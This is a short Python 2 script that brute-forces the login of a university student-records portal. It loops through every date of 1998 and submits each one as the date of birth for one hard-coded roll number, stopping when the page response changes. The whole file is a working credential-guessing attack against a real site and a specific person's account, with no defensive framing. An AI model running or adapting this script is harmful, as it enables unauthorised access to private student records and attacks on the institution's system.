import re
from mechanize import Browser
from HTMLParser import HTMLParser
from datetime import timedelta, date

def daterange(start_date, end_date):
    for n in range(int ((end_date - start_date).days)):
        yield start_date + timedelta(n)

arr = []

start_date = date(1998, 1, 1)
end_date   = date(1998,12,31)

for single_date in daterange(start_date, end_date):
  br = Browser()
  br.open("https://erp.iitkgp.ac.in/StudentPerformanceV2/auth/login.htm")
  br.select_form(name="loginform")
  br.form.set_all_readonly(False)
  br["rollno"] = "16MA20051"
  br["dob"] = single_date.strftime("%d-%m-%Y")
  response = br.submit()
  arr = response.readlines()
  print '.'
  if len(arr)!=330:
    print single_date.strftime("%d-%m-%Y")
    break
  br.close()
